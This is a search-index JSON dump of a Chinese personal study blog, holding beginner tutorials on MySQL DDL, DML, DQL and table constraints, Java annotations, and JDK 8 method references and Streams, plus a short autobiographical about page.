{"meta":{"title":"Ather · Blog","subtitle":null,"description":"知其然知其所以然","author":"Atcher","url":"http://liuhaoan.github.io","root":"/"},"pages":[{"title":"分类","date":"2019-04-05T10:40:51.000Z","updated":"2019-04-08T08:44:43.120Z","comments":true,"path":"categories/index.html","permalink":"http://liuhaoan.github.io/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2019-04-05T10:40:33.000Z","updated":"2019-04-11T06:17:45.814Z","comments":true,"path":"about/index.html","permalink":"http://liuhaoan.github.io/about/index.html","excerpt":"","text":"我呢。。是一个爱自学的人，自从初中被一些所谓的“师傅”坑过几次之后，到大学就再也没有师傅带过我了，引路人 - 是我的兴趣爱好，百度 - 是我最好的老师。 说说我的历程吧。。。初中 接触游戏外挂、黑客技术、网站SEO排名优化等，并且对其感兴趣后来研究了一下。曾建立了一个推广阿里妈妈内商品（淘宝内的商品）的网站，主推猫粮，曾把我网站的“猫粮”关键字优化到了百度首页，后来因为资金原因（毕竟家里穷零花钱少）没弄了。 第一次接触的编程语言是“易语言”，对其深感兴趣，在2014年写出了我第一个发布的软件，这是个游戏辅助软件，在相关游戏论坛反响还不错。后来还接了个单，在那次接单中深刻体会到了——“改需求。。。。。。。。” 附上地址：http://www.cnrust.com/thread-6154-1-1.html 高中 因为对游戏感兴趣，就去学习了一段时间C#和Unity 3D，但是后来发现不是我的菜就不玩了，后来用C#做了一些实用工具，比如：利用自动发POST包达到自动签到目的工具、网站商品发布工具等等。。（当时我弄了个淘宝优惠券推广网站，优惠券是从阿里妈妈弄得，给我的是一个表格文件，因为网站源程序是网上找的，所以功能有所欠缺，没有一个读取表格文件导入商品的功能，我就用C#写了个多线程商品发布工具） 我第一次接触java也是在高中，当时老师知道我会编程，就让我直接边学边写一个“信息部后台管理系统”，说的那么高大上，其实也就是让我没有学过java的情况下直接边学selvlet边写web，后来写完了，顺带还写了个windows的客户端，不过搞笑的是写完后老师都好像离职了，理都不理我了。。。 附上图片，现在机器没有装Mysql，就截个登入页面吧 虽然这是个不愉快的经历，但是却让我知道了Java。 大学 大一上学期就确立好了我的目标，那就是——javaEE方向。如今正在学习中。。。"},{"title":"标签","date":"2019-04-05T10:40:40.000Z","updated":"2019-04-08T08:44:43.121Z","comments":false,"path":"tags/index.html","permalink":"http://liuhaoan.github.io/tags/index.html","excerpt":"","text":""},{"title":"大事年表","date":"2019-04-11T02:25:29.000Z","updated":"2019-04-11T06:12:00.185Z","comments":true,"path":"timelines/index.html","permalink":"http://liuhaoan.github.io/timelines/index.html","excerpt":"","text":"创建本博客纯属学习，如有问题请联系QQ：1280551527 ps：转载文章请注明来源，非常感谢！ 2019 年 4 月 博客建立 1、主要用来复习JavaSE相关知识 2、其次，记录参加信息安全与评估国赛所用到的一些基本Python脚本"}],"posts":[{"title":"Mysql数据库之——表的约束","slug":"Mysql数据库之——表的约束","date":"2019-04-17T08:00:43.000Z","updated":"2019-04-17T09:39:00.703Z","comments":true,"path":"2019/04/17/Mysql数据库之——表的约束/","link":"","permalink":"http://liuhaoan.github.io/2019/04/17/Mysql数据库之——表的约束/","excerpt":"概念 对表中的数据进行限定，从而保证数据的正确性、有效性、完整性 约束的分类 主键约束：primary key 注意事项：1、它自带非空且唯一2、主键就是表中的唯一标识3、一张表只能有一个字段为主键 非空约束：not null 唯一约束：uniqe 注意：限定的值可以有多个null 外键约束：foreign key","text":"概念 对表中的数据进行限定，从而保证数据的正确性、有效性、完整性 约束的分类 主键约束：primary key 注意事项：1、它自带非空且唯一2、主键就是表中的唯一标识3、一张表只能有一个字段为主键 非空约束：not null 唯一约束：uniqe 注意：限定的值可以有多个null 外键约束：foreign key 添加约束的方式 1、在创建表是在数据类型后面接上约束 2、使用修改表的命令修改 对表的约束操作例子：利用修改表来删除非空约束12ALTER TABLE student MODIFY name VARCHAR(20);ps：通用方法，特殊的下面给出了 例子：利用修改表来添加约束1234ALTER TABLE student MODIFY name VARCHAR(20) NOT NULL;-- 添加相关约束时，必须保证该字段的数据要全部满足相关约束的要求ps：通用方法 例子：利用修改表来删除唯一约束1ALTER TABLE student DROP INDEX phone_number; 例子：利用修改表来删除主键约束1ALTER TABLE student DROP PRIMARY KEY; 自动增长 如果某一列是数值类型的，使用 auto_increment 注意事项：1、自动增长是看上一条记录的值 外键约束概述：比如一张表中有很多冗余的数据（重复的数据），我们可以通过外键把这张表拆分为两张表，一张主表记录主要的信息，一张副表用来保存冗余的信息，在主表中可以给某个字段定义一个外键，关联到副表对应的主键中，就好比学生与老师，他们都有名字与年龄，但是职业不同，我们就可以把名字与年龄这种主要信息放在主表中，职业的相关信息就放在副表中，然后主表中每个人的信息都通过外键关联一个自己对应的职业即可。 语法： constraint 外键名称 foreign key 外键列的字段名称 references 主表列的字段名称（外键关联到的表，通常为id） 删除外键 1ALTER TABLE 表名 DROP FOREIGN KEY 外键名称; 创建表后添加外键（创建时直接添加即可） 1ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY 外键列的字段名称 REFERENCES 主表列的字段名称（外键关联到的表，通常为id）； 外键约束的级联操作概述：当副表中的id改变的时候，我们也希望主表中的外键也跟着变化，那么我们就需要用到级联操作了，删除同理。 级联更新：ON UPDATA CASCADE 级联删除：ON DELETE CASCADE ps：在添加外键时，后接级联操作即可 注意事项： 1、在使用级联操作时，要谨慎考虑，因为会影响效率，也会大面积的影响相关数据，一个操作不好容易引起数据缺失2、级联更新和级联删除可以同时添加，两个接一起即可","categories":[{"name":"MySql","slug":"MySql","permalink":"http://liuhaoan.github.io/categories/MySql/"}],"tags":[{"name":"MySql表的约束","slug":"MySql表的约束","permalink":"http://liuhaoan.github.io/tags/MySql表的约束/"}]},{"title":"Mysql数据库之——DQL查询记录","slug":"Mysql数据库之——DQL查询记录","date":"2019-04-17T03:00:13.000Z","updated":"2019-04-17T08:01:09.442Z","comments":true,"path":"2019/04/17/Mysql数据库之——DQL查询记录/","link":"","permalink":"http://liuhaoan.github.io/2019/04/17/Mysql数据库之——DQL查询记录/","excerpt":"概述 查询表中的数据 语法123456789101112select 字段from 表名group by 分组字段having 分组之后的条件order by 排序limit 分页限定","text":"概述 查询表中的数据 语法123456789101112select 字段from 表名group by 分组字段having 分组之后的条件order by 排序limit 分页限定 查询所有1SELECT * FROM student; ps：不建议用*号，建议把所有表名写出来，因为这样更方便写注释 查询后去除重复1SELECT DISTINCT name FROM student; ps：必须结果集完全一样才行，如果我们查询两个字段，那么两个字段的结果集必须全部相同才能够去除重复 查询字段值之和1SELECT name,math,english,math + english from student; 解析：查询名字、数学成绩、英语成绩、数学英语成绩之和 但是有个问题，如果分数都是null，那么结果也是null 解决方法： 1SELECT name,IFNULL(math, 0),IFNULL(english, 0),IFNULL(math, 0) + IFNULL(english, 0) from student; 解析：IFNULL(字段名， 替换的值)为判断某个字段是否为null，是null则替换值。 查询字段之和后显示的不尽人意，我们可以给它取别名 1SELECT name,math,english,math + english AS 总分 from student; 解析：意思是给math + english字段起别名ps：AS可以替换为空格 条件查询 格式： where 后跟条件 运算符 1、&gt;、&lt;、&lt;=、&gt;=、=、&lt;&gt; 2、在一个范围之内 ：BETWEEN...AN例如：between 100 and 200相当于条件在 100 到 200 之间，包头又包尾 3、IN(集合) ： 集合表示多个值，使用逗号分隔，只要配对的上就查得出来 4、LIKE &#39;张%&#39; ： 模糊查询 5、IS NULL : 查询某一列为 NULL 的值，注：不能写=NULL 6、and 或 &amp;&amp; 与，SQL 中建议使用前者，后者并不通用。 7、or 或 || 或 8、not 或 ! 非 注意事项 判断是否为null值时，不能直接等号，必须使用is null 模糊查询 格式： select * from 表名 where 字段 like 条件； 占位符： _ : 代表单个任意字符 % : 代表0或者多个 排序查询 语法： order by 子句 order by 排序字段1 排序方式1, …排序字段n 排序方式n； 注意事项 如果有多个排序条件，当前面排序条件值一样时，才会判断第二条件 排序方式 ASC：升序，也是默认的 DESC：降序 聚合函数 将一列的数据作为一个整体，然后纵向计算 注意事项：聚合函数的计算会排除null值解决方法：1、使用ifnull替换null值2、选择非空的列计算（主键、*） count：计算个数 max：计算最大值 min：计算最小值 sum：计算和 avg：计算平均值 例子：计算总数1SELECT count(id) FROM student; 分组查询 语法：group by 分组字段； 注意事项： 分组之后查询的字段一般为：分组字段、聚合函数，因为查一个组共有的信息才有意义 例子：以男女分组，查询70分以上同学的平均分，并且每组的人数超过2人1SELECT sex AVG(math) COUNT(id) number from student WHERE math &gt; 70 GROUP BY sex HAVING number &gt; 2; 面试题：where和having的区别 1、where 在分组之前进行限定，如果不满足条件，则不进行分组操作。having 在分组之后进行操作，如果不满足条件就不显示 2、where 后不可以跟聚合函数，having后可以跟聚合函数 分页查询 语法： limit 开始索引，每页的条数; 开始索引公式：（页码索引 - 1） * 每页的条数 = 开始的索引 案例：每页显示3条记录123SELECT * FROM student LIMIT 0,3； -- 第一页SELECT * FROM student LIMIT 3,3； -- 第二页SELECT * FROM student LIMIT 6,3； -- 第三页 ps：limit是MySql独有的，其他数据库不是这个关键字","categories":[{"name":"MySql","slug":"MySql","permalink":"http://liuhaoan.github.io/categories/MySql/"}],"tags":[{"name":"MySql数据库DQL","slug":"MySql数据库DQL","permalink":"http://liuhaoan.github.io/tags/MySql数据库DQL/"},{"name":"面试题：where和having的区别","slug":"面试题：where和having的区别","permalink":"http://liuhaoan.github.io/tags/面试题：where和having的区别/"}]},{"title":"Mysql数据库之——DML增删改","slug":"Mysql数据库之——DML增删改","date":"2019-04-17T02:09:18.000Z","updated":"2019-04-17T02:59:10.294Z","comments":true,"path":"2019/04/17/Mysql数据库之——DML增删改/","link":"","permalink":"http://liuhaoan.github.io/2019/04/17/Mysql数据库之——DML增删改/","excerpt":"概述 用于对表中的记录进行增删改操作 插入记录（添加记录） 语法： insert into 表名(列名1,列名2,···列名n) values(值1,值2,···值n)","text":"概述 用于对表中的记录进行增删改操作 插入记录（添加记录） 语法： insert into 表名(列名1,列名2,···列名n) values(值1,值2,···值n) 例子： 1insert into student(id,name,age) values(1,\"张无忌\",18); 注意事项 列名一定要和值一 一对应，类型也需要对应。 如果表名后，不定义列名，则默认给所有列添加值。 除了数字类型，其他类型需要使用引号引起来 删除数据 语法： delete from 表名 [where 条件] 例子：删除id为1的记录 1delete from student where id=1; 注意事项： 不加条件会吧所有记录删除 需要删除所有记录不建议用这个语句，因为有多少条记录就执行了多少次，严重影响效率 需要删除所有记录用：truncate table； – 先删除表，然后创建一张一模一样的空表 修改数据 语法： updata 表名 set 列名1 = 值1, 列名2 = 值2,··· [where 条件] 例子：修改id为1的记录中名字改成“张无忌” 1updata student set name = \"张无忌\" where id = 1; 注意事项： 不加任何条件，则将所有记录都修改","categories":[{"name":"MySql","slug":"MySql","permalink":"http://liuhaoan.github.io/categories/MySql/"}],"tags":[{"name":"MySql数据库DML","slug":"MySql数据库DML","permalink":"http://liuhaoan.github.io/tags/MySql数据库DML/"}]},{"title":"Mysql数据库之——DDL数据库与表的操作","slug":"Mysql数据库之——DDL数据库与表的操作","date":"2019-04-15T09:04:07.000Z","updated":"2019-04-17T01:45:02.903Z","comments":true,"path":"2019/04/15/Mysql数据库之——DDL数据库与表的操作/","link":"","permalink":"http://liuhaoan.github.io/2019/04/15/Mysql数据库之——DDL数据库与表的操作/","excerpt":"DDL概述 用来定义数据库对象：数据库、表、列等 DDL ： 操作数据库、表（CRUD） C(Create) : 创建 R(Retrieve) ： 查询 U(Update) : 修改 D(Delete) ： 删除","text":"DDL概述 用来定义数据库对象：数据库、表、列等 DDL ： 操作数据库、表（CRUD） C(Create) : 创建 R(Retrieve) ： 查询 U(Update) : 修改 D(Delete) ： 删除 创建数据库 ： create 创建数据库 CREATE DATABASE 数据库名; 判断数据库是否已经存在，不存在则创建数据库 CREATE DATABASE IF NOT EXISTS 数据库名; 创建数据库并指定字符集 CREATE DATABASE 数据库名 CHARACTER SET 字符集; 操作示例 12345678-- 直接创建数据库 db1create database db1;-- 判断是否存在，如果不存在则创建数据库 db2create database if not exists db2;-- 创建数据库并指定字符集为 gbkcreate database db3 default character set gbk; 查询数据库123456-- 查看所有的数据库show databases;-- 查看某个数据库的定义信息show create database db3;show create database db1; 修改数据库 修改数据库默认的字符集 ALTER DATABASE 数据库名 DEFAULT CHARACTER SET 字符集;例子：将 db3 数据库的字符集改成 utf8 1alter database db3 character set utf8; 删除数据库 DROP DATABASE 数据库名;例子：删除 db2 数据库 1234drop database db2;//判断是否存在，存在则删除drop database if exists db2 查看正在使用的数据库 SELECT DATABASE(); 使用的一个 mysql 中的全局函数 使用/切换数据库 USE 数据库名;例子： 12345-- 查看正在使用的数据库select database();-- 改变要使用的数据库use db4; 面试题在 MySQL 数据库软件中，有如下三个数据库： test1 test2 test3 登录数据库之后，输入语句：select database test2; 运行结果是什么? 答：这是一条错误的语句，如果要选中一个数据库，应用使用：use test2; DDL 操作表结构 前提先使用某个数据库 创建表 语法： 123456create table 表名( 列名1 数据类型1， 列名2 数据类型3， ··· 列名n 数据类型n); 关键字说明： CREATE 创建 TABLE 表 datatime和timestamp类型的区别： 如果不给这个字段赋值，或者赋值为null，那么timestamp类型的字段则使用当前的系统时间自动赋值，而datatime则不会 例子：创建一个学生表 12345create table student( id int, name varchar(32), age int); MySql数据类型 分类 类型名称 类型说明 整数 tinyInt 微整型：很小的整数(占 8 位二进制) 整数 smallint 小整型：小的整数(占 16 位二进制) 整数 mediumint 中整型：中等长度的整数(占 24 位二进制) 整数 int(integer) 整型：整数类型(占 32 位二进制) 小数 float 单精度浮点数，占 4 个字节 小数 double 双精度浮点数，占 8 个字节 日期 time 表示时间类型 日期 date 表示日期类型 日期 datetime 同时可以表示日期和时间类型 日期 timestamp 表示时间错 字符串 char(m) 固定长度的字符串，无论使用几个字符都占满全部，M 为 0~255 之间的整 字符串 varchar(m) 可变长度的字符串，使用几个字符就占用几个，M 为 0~65535 之间的整数 二进制 tinyblob Big Large Object 允许长度 0~255 字节 二进制 blob 允许长度 0~65535 字节 二进制 mediumblob 允许长度 0~167772150 字节 二进制 longblob 允许长度 0~4294967295 字节 文本 tinytext 允许长度 0~255 字节 文本 text 允许长度 0~65535 字节 文本 mediumtext 允许长度 0~167772150 字节 文本 longtext 允许长度 0~4294967295 字节 案例 : 创建 student 表包含 id,name,birthday 字段 12345create table student ( id int, -- 整数 name varchar(20), -- 字符串 birthday date -- 生日，最后没有逗号); 查看表 查看某个数据库中的所有表 SHOW TABLES; 查看表结构 DESC 表名; 查看创建表的 SQL 语句 SHOW CREATE TABLE 表名; 例子： 查看 test1 数据库中的所有表12use test1;show tables; 例子： 查看 student 表的结构1desc student; 例子： 查看 student 的创建表 SQL 语句12345678show create table student;//结果CREATE TABLE `student` ( `id` int(11) DEFAULT NULL, `name` varchar(20) DEFAULT NULL, `birthday` date DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 快速创建一个表结构相同的表 CREATE TABLE 新表名 LIKE 旧表名; 例子：123-- 创建一个 s1 的表与 student 结构相同create table s1 like student;desc s1; 删除表 直接删除表 DROP TABLE 表名; 判断表是否存在，如果存在则删除表 DROP TABLE IF EXISTS 表名; 例子：12345-- 直接删除表 s1 表drop table s1;-- 判断表是否存在并删除 s1 表drop table if exists `s1`; 修改表结构 添加表列 ADD ALTER TABLE 表名 ADD 列名 类型; 修改列类型 MODIFY ALTER TABLE 表名 MODIFY 列名 新的类型; 修改列名 CHANGE ALTER TABLE 表名 CHANGE 旧列名 新列名 类型; 删除列 DROP ALTER TABLE 表名 DROP 列名; 修改表名 RENAME TABLE 表名 TO 新表名;例子：将学生表 student 改名成 student2 1rename table student to student2; 修改字符集 character set ALTER TABLE 表名 character set 字符集例子：将 student2 表的编码修改成 gbk 1alter table student2 character set gbk;","categories":[{"name":"MySql","slug":"MySql","permalink":"http://liuhaoan.github.io/categories/MySql/"}],"tags":[{"name":"MySql数据库DDL","slug":"MySql数据库DDL","permalink":"http://liuhaoan.github.io/tags/MySql数据库DDL/"},{"name":"面试题","slug":"面试题","permalink":"http://liuhaoan.github.io/tags/面试题/"}]},{"title":"Mysql数据库之——数据库的概念","slug":"Mysql数据库之——数据库的概念","date":"2019-04-15T07:55:41.000Z","updated":"2019-04-15T09:15:28.371Z","comments":true,"path":"2019/04/15/Mysql数据库之——数据库的概念/","link":"","permalink":"http://liuhaoan.github.io/2019/04/15/Mysql数据库之——数据库的概念/","excerpt":"数据库的基本概念 数据库的英文单词：DataBase 简称：DB 什么是数据库 用于存储和管理数据的仓库","text":"数据库的基本概念 数据库的英文单词：DataBase 简称：DB 什么是数据库 用于存储和管理数据的仓库 数据库的特点： 持久化存储数据的，其实数据库就是一个文件系统 方便存储和管理数据 使用了统一的方式操作数据库——SQL 常见的数据库软件： Oracle Mysql（开源免费的，但是被Oracle收购后6.x开始需要收费了） Sql Server（通常C#、.net用） DB2 ······· Mysql是如何存储数据？ 数据文件全部存在C://ProgramData/MySql/MySql 5.5/data中 一个文件夹 = 一个数据库 文件夹中的一个.frm结尾文件 = 数据库中的一张表 SQL的分类 DDL ： 操作数据库、表 DML ： 增、删、改表中的数据 DQL ： 查询表中的数据 DCL ： 定义数据库的访问权限和安全级别，以及创建用户 MySql的语法 每条语句以分号结尾，如果在 SQLyog 中不是必须加的。 SQL 中不区分大小写，关键字中认为大写和小写是一样的 3 种注释： --空格 单行注释 /* */ 多行注释 # 这是 mysql 特有的注释方式","categories":[{"name":"MySql","slug":"MySql","permalink":"http://liuhaoan.github.io/categories/MySql/"}],"tags":[{"name":"数据库的概念","slug":"数据库的概念","permalink":"http://liuhaoan.github.io/tags/数据库的概念/"}]},{"title":"javaSE复习之——注解","slug":"javaSE复习之——注解","date":"2019-04-15T02:36:22.000Z","updated":"2019-04-15T07:49:37.606Z","comments":true,"path":"2019/04/15/javaSE复习之——注解/","link":"","permalink":"http://liuhaoan.github.io/2019/04/15/javaSE复习之——注解/","excerpt":"注解概念 它是用来说明程序的，我们知道注释是给程序员看的，那么注解就是给程序看的。","text":"注解概念 它是用来说明程序的，我们知道注释是给程序员看的，那么注解就是给程序看的。 注解的作用 用来编译检查 通过代码中的标识，编译器可以实现最基本的编译检查 撰写文档 通过代码里的注解生成文档 代码分析 通过代码里标识的注解对代码进行分析（使用反射） JDK中预定义好的注解 @Deprecated 意思是“废弃的，过时的”，标识方法后表示这个方法是过时的，不建议用，但还是可以用 @Override 意思是“重写、覆盖”，用来检查是否继承自父类（接口）的 @SuppressWarnings 意思是“压制警告”，编译器会有很多黄色的警告，我们不想看到它就可以使用SuppressWarnings使用方法：@SuppressWarnings（“all”）作用是压制所有警告 一般传递参数“all” 自定义注解 格式（分为两部分）： 1234元注解public @interface 注解名称&#123; 属性列表&#125; 本质：它本质上就是一个接口，该接口默认继承Annotation接口 public interface 接口名称(注解名称) extends java.lang.annotation.Annotation {} 属性：接口中的抽象方法 要求： 1、属性的返回值类型由下列取值 基本数据类型 String 枚举 注解 以上类型的数组 2、定义了属性，在使用时需要给属性赋值 如果定义属性时使用Default关键字给属性默认初始化值，则使用注解时，可以不进行属性的赋值。 如果只有一个属性需要赋值，并且属性的名称是value，则value可以省略，直接定义值即可 数组赋值时，使用{}包裹。如果数组中只有一个值，{}可以省略 属性的使用@注解名(属性名 = 属性值) 元注解：用于描述注解的注解 @Target：描述注解能够作用的位置 ElementType取值： TYPE:可以作用在类上 METHOD：可以作用于方法上 FIELD：可以作用在成员变量上 @Retention：描述注解被保留的阶段 @Retention(RetentionPolicy.RUNTIME)：当前被描述的注解会被保留到class字节码中，并且被jvm读取到 @Documented 描述注解被提取到api文档中（在文档中显示） @Inherited 描述注解被子类继承（子类继承父类的注解） 使用注解（解析注解） 自定义一个注解，比如这个注解的属性有：className() 和 MtehodName() 创建一个类，使用这个注解，并且给属性赋值 获取该类的字节码文件对象 1Class&lt;刚刚创建的类名&gt; reflectClass = 类名.class 获取注解对象 1注解名 an = reflectClass.getAnnotation(注解名.class) ps：其实就是在内存中生成了一个该注解接口的子类实现对象12345678910//在内存中生成的子类实现对象public alcss ProImpl implements Pro &#123; public String className() &#123; return \"com.liuhaoan.annotation.Demo1\"; &#125; public String methodName &#123; return \"show\"; &#125;&#125; 调用注解抽象方法获取配置属性值12String className = an.className();String methodName = an.methodName(); 小结 以后大多数时候，我们会使用注解，而不是自定义注解 注解给谁用？ 编译器 解析程序（比如测试框架） 注解不是程序的一部分，而是类似于标签。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"JDK5新特性","slug":"JDK5新特性","permalink":"http://liuhaoan.github.io/tags/JDK5新特性/"},{"name":"注解","slug":"注解","permalink":"http://liuhaoan.github.io/tags/注解/"}]},{"title":"javaSE复习之——JDK8新特性_Stream流_方法引用","slug":"javaSE复习之——JDK8新特性-Stream流-方法引用","date":"2019-04-11T09:12:04.000Z","updated":"2019-04-15T02:36:55.148Z","comments":true,"path":"2019/04/11/javaSE复习之——JDK8新特性-Stream流-方法引用/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——JDK8新特性-Stream流-方法引用/","excerpt":"方法引用 它主要是对Lambda表达式的一种优化，在我们使用Lambda表达式的时候，我们实际上传递进去的代码是一种解决方案，比如拿什么参数做什么。 但是有一种情况：如果我们在Lambda中所使用的一种方案，在其他地方已经存在相同的方案，那么我们还需要再写重复的逻辑了嘛？？？","text":"方法引用 它主要是对Lambda表达式的一种优化，在我们使用Lambda表达式的时候，我们实际上传递进去的代码是一种解决方案，比如拿什么参数做什么。 但是有一种情况：如果我们在Lambda中所使用的一种方案，在其他地方已经存在相同的方案，那么我们还需要再写重复的逻辑了嘛？？？ 举个例子 我们创建一个函数式接口，这个接口专门打印字符串，那么我们使用Lambda时需要的代码量就比较多 代码示例（反例）123456789101112131415161718//这里创建一个函数式接口@FunctionalInterfacepublic interface Printable &#123; void print(String str);&#125;public class Demo01PrintSimple &#123; //一个静态方法，传入的参数是一个接口 private static void printString(Printable data) &#123; data.print(\"Hello, World!\"); &#125; //使用Lambda表达式，实现打印字符串 public static void main(String[] args) &#123; printString(s ‐&gt; System.out.println(s)); &#125;&#125; 使用Lambda中的方法引用优化上例的代码12345678910public class Demo02PrintRef &#123; private static void printString(Printable data) &#123; data.print(\"Hello, World!\"); &#125; public static void main(String[] args) &#123; printString(System.out::println); //因为系统自带了就有打印字符串的实现，所以我们可以不需要使用Lambda去写功能的实现，而是直接调用已经实现好的。 &#125;&#125; 方法引用符：“：：” 双冒号：：为引用运算符，它所在的表达式被称为方法引用。如果Lambda要表达的函数方案已经存在于某个方法的实现中，我们就可以通过双冒号来引用该方法作为Lambda的代替者 上面两个案列的语义分析 s -&gt; System.out.println(s) 拿到参数后经过Lambda，传递给System.out.println方法处理 System.out::println 直接让System.out中的println方法来取代Lambda 使用对象的引用名来引用成员方法 首先我们有一个接口 1234@FunctionalInterfacepublic interface Printable &#123; void print(String str);&#125; 然后我们有一个实现功能的类 12345public class MethodRefObject &#123; public void printUpperCase(String str) &#123; System.out.println(str.toUpperCase()); &#125;&#125; 当我们使用lambda，并且在Lambda中具体实现功能时，需要创建MethodRefObject类时，我们可以直接先创建类，然后直接引用它 12345678910public class Demo04MethodRef &#123; private static void printString(Printable lambda) &#123; lambda.print(\"Hello\"); &#125; public static void main(String[] args) &#123; MethodRefObject obj = new MethodRefObject(); printString(obj::printUpperCase); //我们不需要在Lambda中创建类，然后调用，我们直接引用它即可 &#125;&#125; 通过类目引用静态成员 由于在 java.lang.Math 类中已经存在了静态方法 abs ，所以当我们需要通过Lambda来调用该方法时，有两种写法。 定义一个函数式接口 1234@FunctionalInterfacepublic interface Calcable &#123; int calc(int num);&#125; 第一种写法是使用Lambda表达式： 12345678public class Demo05Lambda &#123; private static void method(int num, Calcable lambda) &#123; System.out.println(lambda.calc(num)); &#125; public static void main(String[] args) &#123; method(‐10, n ‐&gt; Math.abs(n)); &#125;&#125; 不过我们有一种更好的写法，那就是用方法引用 12345678public class Demo06MethodRef &#123; private static void method(int num, Calcable lambda) &#123; System.out.println(lambda.calc(num)); &#125; public static void main(String[] args) &#123; method(‐10, Math::abs); &#125;&#125; 在这两个例子中，下面两种写法是相等的 Lambda表达式： n -&gt; Math.abs(n) 方法引用： Math::abs 通过super引用成员方法 定义一个函数式接口 1234@FunctionalInterfacepublic interface Greetable &#123; void greet();&#125; 父类Human类 12345public class Human &#123; public void sayHello() &#123; System.out.println(\"Hello!\"); &#125;&#125; 子类Man类 12345678910111213public class Man extends Human &#123; @Override public void sayHello() &#123; System.out.println(\"大家好,我是Man!\"); &#125; //定义方法method,参数传递Greetable接口 public void method(Greetable g)&#123; g.greet(); &#125; public void show()&#123; method(super::sayHello); &#125;&#125; 通过this引用成员方法 与super引用父类成员方法同理 类的构造器的引用（构造方法，也就是通过引用创建对象） 以构造器引用使用 类名称::new 的格式表示。 首先有个Person类 123456789101112131415public class Person &#123; private String name; public Person(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 然后创建一个Person对象的函数式接口 123public interface PersonBuilder &#123; Person buildPerson(String name);&#125; 通过构造器引用来调用 123456789public class Demo10ConstructorRef &#123; public static void printName(String name, PersonBuilder builder) &#123; System.out.println(builder.buildPerson(name).getName()); &#125; public static void main(String[] args) &#123; printName(\"赵丽颖\", Person::new); &#125;&#125; 下面两种写法是等效的： Lambda表达式： name -&gt; new Person(name) 方法引用： Person::new 数组构造器的引用（创建数组） 数组也是 Object 的子类对象，所以同样具有构造器，只是语法稍有不同 首先定义一个函数式接口 1234@FunctionalInterfacepublic interface ArrayBuilder &#123; int[] buildArray(int length);&#125; 使用构造器引用创建数组 12345678public class Demo12ArrayInitRef &#123; private static int[] initArray(int length, ArrayBuilder builder) &#123; return builder.buildArray(length); &#125; public static void main(String[] args) &#123; int[] array = initArray(10, int[]::new); &#125;&#125; 下面两种写法是等效的： Lambda表达式： length -&gt; new int[length] 方法引用： int[]::new","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Stream流方法引用","slug":"Stream流方法引用","permalink":"http://liuhaoan.github.io/tags/Stream流方法引用/"},{"name":"Stream流","slug":"Stream流","permalink":"http://liuhaoan.github.io/tags/Stream流/"},{"name":"方法引用","slug":"方法引用","permalink":"http://liuhaoan.github.io/tags/方法引用/"}]},{"title":"javaSE复习之——JDK8新特性_Stream流练习","slug":"javaSE复习之——JDK8新特性-Stream流练习","date":"2019-04-11T09:09:41.000Z","updated":"2019-04-11T09:10:37.652Z","comments":true,"path":"2019/04/11/javaSE复习之——JDK8新特性-Stream流练习/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——JDK8新特性-Stream流练习/","excerpt":"代码示例","text":"代码示例 1234567891011121314151617181920212223242526272829303132333435/*1. 第一个队伍只要名字为3个字的成员姓名；存储到一个新集合中。2. 第一个队伍筛选之后只要前3个人；存储到一个新集合中。3. 第二个队伍只要姓张的成员姓名；存储到一个新集合中。4. 第二个队伍筛选之后不要前2个人；存储到一个新集合中。5. 将两个队伍合并为一个队伍；存储到一个新集合中。6. 根据姓名创建 Person 对象；存储到一个新集合中。7. 打印整个队伍的Person对象信息。*/public static void main(String[] args) &#123; //第一支队伍 ArrayList&lt;String&gt; one = new ArrayList&lt;&gt;(); one.add(\"迪丽热巴\"); one.add(\"宋远桥\"); one.add(\"苏星河\"); one.add(\"石破天\"); one.add(\"石中玉\"); one.add(\"老子\"); one.add(\"庄子\"); one.add(\"洪七公\"); Stream&lt;String&gt; s1 = one.stream().filter(name -&gt; name.length() == 3).limit(3); //第二支队伍 ArrayList&lt;String&gt; two = new ArrayList&lt;&gt;(); two.add(\"古力娜扎\"); two.add(\"张无忌\"); two.add(\"赵丽颖\"); two.add(\"张三丰\"); two.add(\"尼古拉斯赵四\"); two.add(\"张天爱\"); two.add(\"张二狗\"); Stream&lt;String&gt; s2 = two.stream().filter(n -&gt; n.startsWith(\"张\")).skip(2); Stream&lt;String&gt; ss = Stream.concat(s1, s2); ss.forEach(n -&gt; System.out.println(n));&#125;","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Stream流练习","slug":"Stream流练习","permalink":"http://liuhaoan.github.io/tags/Stream流练习/"}]},{"title":"javaSE复习之——JDK8新特性_Stream流","slug":"javaSE复习之——JDK8新特性-Stream流","date":"2019-04-11T07:31:42.000Z","updated":"2019-04-11T09:09:22.625Z","comments":true,"path":"2019/04/11/javaSE复习之——JDK8新特性-Stream流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——JDK8新特性-Stream流/","excerpt":"Stream流 说到Stream便容易想到I/O Stream，而实际上，谁规定“流”一定是“IO流”呢？ 在Java 8中，得益于Lambda所带来的的函数式编程，引入了一个全新的Stream概念，它关注的是做什么，而不是怎么做，用于解决已有集合类库所有的弊端","text":"Stream流 说到Stream便容易想到I/O Stream，而实际上，谁规定“流”一定是“IO流”呢？ 在Java 8中，得益于Lambda所带来的的函数式编程，引入了一个全新的Stream概念，它关注的是做什么，而不是怎么做，用于解决已有集合类库所有的弊端 案例 使用Stream流的方式过滤并且遍历集合1234567891011121314151617 public static void main(String[] args) &#123; //创建一个List集合,存储姓名 List&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"张无忌\"); list.add(\"周芷若\"); list.add(\"赵敏\"); list.add(\"张强\"); list.add(\"张三丰\"); //对list集合中的元素进行过滤,只要以张开头的元素,存储到一个新的集合中 //对listA集合进行过滤,只要姓名长度为3的人,存储到一个新集合中 //遍历listB集合 list.stream() 